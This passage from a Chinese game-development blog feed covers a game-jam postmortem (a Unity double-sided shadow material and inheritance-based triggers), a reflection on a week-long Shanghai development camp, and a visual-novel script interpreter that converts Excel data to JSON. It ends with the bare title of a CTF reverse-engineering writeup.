&lt;p&gt;所以这里卡了我好几天，找不到解决方式，很难受。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bilibili.com/video/BV1Cf4y137eP&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;这个视频&lt;/a&gt;给了灵感。可以在评论区找到我（&lt;/p&gt;
&lt;p&gt;解决这个问题很简单，只要重新做一个材质，然后勾选上双面选项就行了。&lt;/p&gt;
&lt;p&gt;双击这个材质，默认材质不能修改，但我们可以看到一些信息：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001054353-1630408219.png&#34;
	width=&#34;441&#34;
	height=&#34;453&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001054353-1630408219_hu4153345653741131502.png 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001054353-1630408219_hu7924780461217326289.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210827151253043&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;97&#34;
		data-flex-basis=&#34;233px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;所以只要右键创建一个Material，然后仿制做成这个样子就可以了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001054609-2105206737.png&#34;
	width=&#34;454&#34;
	height=&#34;358&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001054609-2105206737_hu13157305737872446203.png 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001054609-2105206737_hu16008059282177556205.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210827151522412&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;304px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;给sprite换上新的材质，就实现了双面投影！&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001057146-2037201363.gif&#34;
	width=&#34;977&#34;
	height=&#34;492&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001057146-2037201363_hu11209532611330517948.gif 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001057146-2037201363_hu14324615453958631162.gif 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;演示2&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;198&#34;
		data-flex-basis=&#34;476px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;怎么样，是不是很帅气呢！来，试试看！&lt;/p&gt;
&lt;h2 id=&#34;面向对象思想的便捷&#34;&gt;面向对象思想的便捷
&lt;/h2&gt;&lt;p&gt;这次的小demo中最主要的互动如图下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001100808-1973660236.gif&#34;
	width=&#34;977&#34;
	height=&#34;492&#34;
	srcset=&#34;https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001100808-1973660236_hu6457664907856745437.gif 480w, https://dorinxl.github.io/p/gamejam%E6%9C%BA%E6%A0%B8%E7%BD%91booom%E6%B8%B8%E6%88%8F%E5%88%9B%E4%BD%9C%E6%8C%91%E6%88%98%E5%BC%80%E5%8F%91%E5%A4%8D%E7%9B%98/1858293-20210828001100808-1973660236_hu10196642271296182422.gif 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;演示3&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;198&#34;
		data-flex-basis=&#34;476px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;就是一个靠近会弹动画，离开会收动画，触发会产生事件的触发器。&lt;/p&gt;
&lt;p&gt;之前没怎么在项目中好好的用面向对象的思想，这次用上了，感觉就是非常爽。&lt;/p&gt;
&lt;p&gt;写一个基类触发器，然后通过继承多态延伸出不同的触发事件，十分方便，十分的雅致。&lt;/p&gt;
&lt;h2 id=&#34;一些不足&#34;&gt;一些不足
&lt;/h2&gt;&lt;h3 id=&#34;剧情演出效果不足&#34;&gt;剧情演出效果不足
&lt;/h3&gt;&lt;p&gt;之前写的gal框架被我多次使用，但是从来没升级过。考虑一下完善框架了。&lt;/p&gt;
&lt;p&gt;目前的框架最大的问题就是演出效果，我是用协程来实现人物、场景的过渡，但是在一定条件下貌似会起冲突，很不爽。&lt;/p&gt;
&lt;p&gt;正在试图找到新的代替方案，希望能有一种更优雅的过渡方式。&lt;/p&gt;
&lt;h3 id=&#34;战斗系统的bug&#34;&gt;战斗系统的bug
&lt;/h3&gt;&lt;p&gt;战斗这块是上海七天写的，不够稳定，经常出一些莫名其妙的效果。&lt;/p&gt;
&lt;p&gt;比如这次的开发，在3D场景用2D物理战斗，效果十分滑稽，策划说是“人仰马翻的战斗”，确实如此（具体可以亲自游玩体验）。我也不是很满意，但是时间紧任务多没来得及尝试新的解决方案，先在这里记录下。&lt;/p&gt;
&lt;h3 id=&#34;ui的适配问题&#34;&gt;UI的适配问题
&lt;/h3&gt;&lt;p&gt;游戏做好了，提交了，我才想起来UI的适配不是很好，在1920*1080下效果最佳。&lt;/p&gt;
&lt;p&gt;这波是没有规划好开发路线，我的锅。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结
&lt;/h2&gt;&lt;p&gt;三月到五月，我完成了基础的gal框架，并且从0学会了使用unity的部分板块，接触了UI以及一些基本内容。&lt;/p&gt;
&lt;p&gt;七月后半旬，接触了2d物理引擎，到此算是拥有制作低水平小游戏的能力了。&lt;/p&gt;
&lt;p&gt;八月就是一次技能整合，把我会的东西都用上了，整了这么一出。&lt;/p&gt;
&lt;p&gt;要开学了，我目前的规划是积累沉淀。&lt;/p&gt;
&lt;p&gt;我思考了一下，本质上自己还是一个程序员，那么想要有进步就要先把本职做好。&lt;/p&gt;
&lt;p&gt;就算unity用的驾轻就熟，数据结构、算法、数据库、网络这些没学好也没什么用。&lt;/p&gt;
&lt;p&gt;一个基础扎实的人，哪怕培训他学unity也会上手很快。&lt;/p&gt;
&lt;p&gt;所以我决定回头，把基础学好，这是稳赚不赔的买卖。&lt;/p&gt;
&lt;p&gt;这不意味着延缓梦想，只不过是为了更好的出发。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【UGDAP】上海一周自由行结束!</title>
        <link>https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/</link>
        <pubDate>Tue, 27 Jul 2021 15:51:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/</guid>
        <description>&lt;img src="https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=WAIgA1gCIAMRECc%21&amp;t=5&amp;tl=3&amp;su=0196274450&amp;tm=1627398000&amp;sce=0-12-12&amp;rf=2-9.jpg" alt="Featured image of post 【UGDAP】上海一周自由行结束!" /&gt;&lt;h1 id=&#34;上海一周自由行结束&#34;&gt;上海一周自由行结束!
&lt;/h1&gt;&lt;h5 id=&#34;指每天在宾馆爆肝代码好不容易有时间了还遇上台风哪也没去的一周&#34;&gt;指每天在宾馆爆肝代码，好不容易有时间了还遇上台风哪也没去的一周。
&lt;/h5&gt;&lt;p&gt;​                                                &lt;img src=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=WAIgA1gCIAMRECc%21&amp;amp;t=5&amp;amp;tl=3&amp;amp;su=056548530&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9.jpg&#34;
	width=&#34;600&#34;
	height=&#34;800&#34;
	srcset=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=WAIgA1gCIAMRECc%21&amp;amp;t=5&amp;amp;tl=3&amp;amp;su=056548530&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu7131790711351620230.jpg 480w, https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=WAIgA1gCIAMRECc%21&amp;amp;t=5&amp;amp;tl=3&amp;amp;su=056548530&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu4142932058124149472.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;img&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;75&#34;
		data-flex-basis=&#34;180px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;见识了一流大学的模样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;p&gt;总结复盘一下:&lt;/p&gt;
&lt;p&gt;第一天跟策划交流想法并控制他不要做出我实现不了的决定&lt;/p&gt;
&lt;p&gt;第二天敲代码，功能实现验证&lt;/p&gt;
&lt;p&gt;第三天敲代码，玩家动作控制&lt;/p&gt;
&lt;p&gt;第四天敲代码，敌人行为状态机&lt;/p&gt;
&lt;p&gt;第五天敲代码，完成四个敌人的行为&lt;/p&gt;
&lt;p&gt;第六天敲代码，给角色加状态，这个时候已经打不过自己的游戏了&lt;/p&gt;
&lt;p&gt;第七天敲代码，切实感受项目上线前跟本没写完的危机，短短一上午完成地图场景人物对话缝合好整套流程，忍痛切割了部分功能，最后演示完成后人直接升天。&lt;/p&gt;
&lt;p&gt;​                                                &lt;img src=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=IANYAiADWAIRECc%21&amp;amp;t=5&amp;amp;tl=3&amp;amp;su=0253078034&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9.jpg&#34;
	width=&#34;800&#34;
	height=&#34;600&#34;
	srcset=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=IANYAiADWAIRECc%21&amp;amp;t=5&amp;amp;tl=3&amp;amp;su=0253078034&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu7312656646813979167.jpg 480w, https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=IANYAiADWAIRECc%21&amp;amp;t=5&amp;amp;tl=3&amp;amp;su=0253078034&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu7828174738266870104.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;img&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;133&#34;
		data-flex-basis=&#34;320px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;快乐白模时间&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​                                                &lt;img src=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=IAPCASADwgEDEDU%21&amp;amp;tl=1&amp;amp;su=011038914&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9.png&#34;
	width=&#34;800&#34;
	height=&#34;450&#34;
	srcset=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=IAPCASADwgEDEDU%21&amp;amp;tl=1&amp;amp;su=011038914&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu3513115789505701596.png 480w, https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=IAPCASADwgEDEDU%21&amp;amp;tl=1&amp;amp;su=011038914&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu8056087972492975454.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;img&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;主美妈咪好强&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​                                                &lt;img src=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=IAPCASADwgEDEDU%21&amp;amp;tl=1&amp;amp;su=0104509314&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9.png&#34;
	width=&#34;800&#34;
	height=&#34;450&#34;
	srcset=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=IAPCASADwgEDEDU%21&amp;amp;tl=1&amp;amp;su=0104509314&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu10427604692049946515.png 480w, https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=IAPCASADwgEDEDU%21&amp;amp;tl=1&amp;amp;su=0104509314&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu1885937133506825187.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;img&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;hellip;过于简陋了，考虑了下还是放出来吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这几天下来，感悟颇多，难以言表。周围有很多志同道合的朋友，各自心里怀揣着相似相近的野心和梦想，在交流和冲突之中，面对游戏我仿佛有了更深的体验，但也更加陌生。这些都是我从未体验过的。&lt;/p&gt;
&lt;p&gt;大学过了一半了，我必须认识到游戏开发与网络安全不能并重，我选择了我热爱的方向，所以这是一次求道问心之旅。独自前往中国最繁华的城市之一，与相识已久的网友第一次碰面，在人群中寻找合作伙伴，用六天时间合力开发出一个能让自己满意的作品。&lt;/p&gt;
&lt;p&gt;这是我想要的么?这确实是。&lt;/p&gt;
&lt;p&gt;结果是否满意?多给我点时间我能做的更好。&lt;/p&gt;
&lt;p&gt;累么?不累是不可能的，但沉浸在开发中是感受不到累的，只有在最后倦意才会一起袭来。&lt;/p&gt;
&lt;p&gt;​                                                &lt;img src=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=WAIgA1gCIAMRECc%21&amp;amp;t=5&amp;amp;tl=3&amp;amp;su=0196274450&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9.jpg&#34;
	width=&#34;600&#34;
	height=&#34;800&#34;
	srcset=&#34;https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=WAIgA1gCIAMRECc%21&amp;amp;t=5&amp;amp;tl=3&amp;amp;su=0196274450&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu14160087933095339197.jpg 480w, https://dorinxl.github.io/p/ugdap%E4%B8%8A%E6%B5%B7%E4%B8%80%E5%91%A8%E8%87%AA%E7%94%B1%E8%A1%8C%E7%BB%93%E6%9D%9F/b&amp;amp;ek=1&amp;amp;kp=1&amp;amp;pt=0&amp;amp;bo=WAIgA1gCIAMRECc%21&amp;amp;t=5&amp;amp;tl=3&amp;amp;su=0196274450&amp;amp;tm=1627398000&amp;amp;sce=0-12-12&amp;amp;rf=2-9_hu14678146101060194641.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;img&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;75&#34;
		data-flex-basis=&#34;180px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;与其说是来体验游戏开发的大致流程，不如说是对自我的一次挑战，参与像是gamejam一样的极限开发，并从中学习到新事物。&lt;/p&gt;
&lt;p&gt;比较遗憾的是突遇台风，没有玩好，没有合影，没有留下这段时间的痕迹和记录。&lt;/p&gt;
&lt;p&gt;但还好，来就是明心证道，对未来感到迷茫，至少自己选了一条方向，能做到无悔已是足够。&lt;/p&gt;
&lt;p&gt;人生如戏，一款游戏能带给我的思考和感悟，生活自然带来的更多，或许是无聊的自我感动，但我很享受这种感动。&lt;/p&gt;
&lt;p&gt;总结一句话就是，不负此行。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【Unity】Galgame视觉小说游戏 其脚本解释器的一种实现</title>
        <link>https://dorinxl.github.io/p/unitygalgame%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E6%B8%B8%E6%88%8F-%E5%85%B6%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%9E%E7%8E%B0/</link>
        <pubDate>Tue, 08 Jun 2021 12:39:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/unitygalgame%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E6%B8%B8%E6%88%8F-%E5%85%B6%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%9E%E7%8E%B0/</guid>
        <description>&lt;h1 id=&#34;unity脚本解释器的一种实现&#34;&gt;【Unity】脚本解释器的一种实现
&lt;/h1&gt;&lt;p&gt; &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Galgame引擎/框架本身就是一个解释器，解释脚本读取配置文件，进行演出。&lt;/p&gt;
&lt;p&gt;保存存档时要将当时脚本的运行状态保存下来，以便读档时继续执行，也就是脚本运行状态的序列化与反序列化。&lt;/p&gt;
&lt;p&gt;——JomiXedYu  &lt;a class=&#34;link&#34; href=&#34;http://www.imxqy.com/gamedev/unity/ugal.html#toc-8&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.imxqy.com/gamedev/unity/ugal.html#toc-8&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;前辈所言，我深以为然。&lt;/p&gt;
&lt;p&gt;galgame的剧情，说白了就是指令操控内容。而这种文字游戏的卖点就是图像与剧情。程序显然写不出大量的剧情脚本，但是编剧也不一定会写程序。所以我决定将团队中编剧与程序彻底分离，让编剧只用excel表格就可以控制游戏流程。&lt;/p&gt;
&lt;p&gt;这样做缺点也很明显，表格之间是不存在逻辑的。只能一行一行的取出数据，执行。&lt;/p&gt;
&lt;p&gt;不过做一款视觉小说，这样的方法够用了，而且可以省下不少时间，规定一套逻辑执行语句也方便维护修改。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h1 id=&#34;思路&#34;&gt;思路
&lt;/h1&gt;&lt;p&gt;大致来讲就是“&lt;strong&gt;制定规则——编剧写入excel——程序读取excel——执行&lt;/strong&gt;”，很简单。&lt;/p&gt;
&lt;p&gt;在这个基础上我们可以添加一些其他内容，比如目前我开发的流程为：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/unitygalgame%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E6%B8%B8%E6%88%8F-%E5%85%B6%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%9E%E7%8E%B0/1858293-20210608203807228-1385463138.png&#34;
	width=&#34;1092&#34;
	height=&#34;166&#34;
	srcset=&#34;https://dorinxl.github.io/p/unitygalgame%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E6%B8%B8%E6%88%8F-%E5%85%B6%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%9E%E7%8E%B0/1858293-20210608203807228-1385463138_hu6434785964173972876.png 480w, https://dorinxl.github.io/p/unitygalgame%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E6%B8%B8%E6%88%8F-%E5%85%B6%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%9E%E7%8E%B0/1858293-20210608203807228-1385463138_hu15242380724291886223.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210608202251817&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;657&#34;
		data-flex-basis=&#34;1578px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我尝试写入excel一些数据，这个过程十分痛苦，就像便秘了好几天。而且会出现肉眼检查不到的错误。所以我写个小工具帮助编剧导入并保存数据到excel。&lt;/p&gt;
&lt;p&gt;关于读取数据这部分，一开始我的选择是游戏运行时读excel，但是这样做感觉很累赘，不如直接写成json然后程序去读json来的快。&lt;/p&gt;
&lt;p&gt;其实程序这方面还是有很多不足，软件的设计模式摸得不是很清楚，仍需努力（指先做出来再说）。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;规则与小工具&#34;&gt;规则与小工具
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/unitygalgame%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E6%B8%B8%E6%88%8F-%E5%85%B6%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%9E%E7%8E%B0/1858293-20210608203807666-949828124.png&#34;
	width=&#34;1135&#34;
	height=&#34;690&#34;
	srcset=&#34;https://dorinxl.github.io/p/unitygalgame%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E6%B8%B8%E6%88%8F-%E5%85%B6%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%9E%E7%8E%B0/1858293-20210608203807666-949828124_hu9613405229968905992.png 480w, https://dorinxl.github.io/p/unitygalgame%E8%A7%86%E8%A7%89%E5%B0%8F%E8%AF%B4%E6%B8%B8%E6%88%8F-%E5%85%B6%E8%84%9A%E6%9C%AC%E8%A7%A3%E9%87%8A%E5%99%A8%E7%9A%84%E4%B8%80%E7%A7%8D%E5%AE%9E%E7%8E%B0/1858293-20210608203807666-949828124_hu15768874717462209582.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20210608202651494&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;164&#34;
		data-flex-basis=&#34;394px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;上面这张图是和编剧做好的指令规则约定以及这个小工具的界面，用选项可以帮助编剧不写入奇怪的符号或者不在范围内的规则。&lt;/p&gt;
&lt;p&gt;因为是自己写的，所以后面制定新的规则或者需求了可以很快速的修改。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;写入excel&#34;&gt;写入excel
&lt;/h2&gt;&lt;p&gt;用微软的com组件操作excel，保存的时候直接&lt;code&gt;excel.Value&lt;/code&gt;赋值。&lt;/p&gt;
&lt;p&gt;在unity中写个MenuItem，游戏运行前用&lt;code&gt;JsonUtility.ToJson()&lt;/code&gt;创造j或者更新son文件。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h2 id=&#34;读取excel&#34;&gt;读取Excel
&lt;/h2&gt;&lt;p&gt;直接&lt;code&gt;JsonUtility.FromJson&amp;lt;&amp;gt;();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;解析成一句一句话然后在游戏运行状态机需要解析的时候找到对应函数执行即可。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;h1 id=&#34;妄言妄听&#34;&gt;妄言妄听
&lt;/h1&gt;&lt;p&gt;如此这般，基本脚本解释器的思路就是这样。&lt;/p&gt;
&lt;p&gt;回看代码，深觉自身不足，无论是设计模式还是安全架构，我负责的程序只能拿个40分。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【个人向】ctf比赛出的一道逆向游戏题——GameTime题解</title>
        <link>https://dorinxl.github.io/p/%E4%B8%AA%E4%BA%BA%E5%90%91ctf%E6%AF%94%E8%B5%9B%E5%87%BA%E7%9A%84%E4%B8%80%E9%81%93%E9%80%86%E5%90%91%E6%B8%B8%E6%88%8F%E9%A2%98gametime%E9%A2%98%E8%A7%A3/</link>
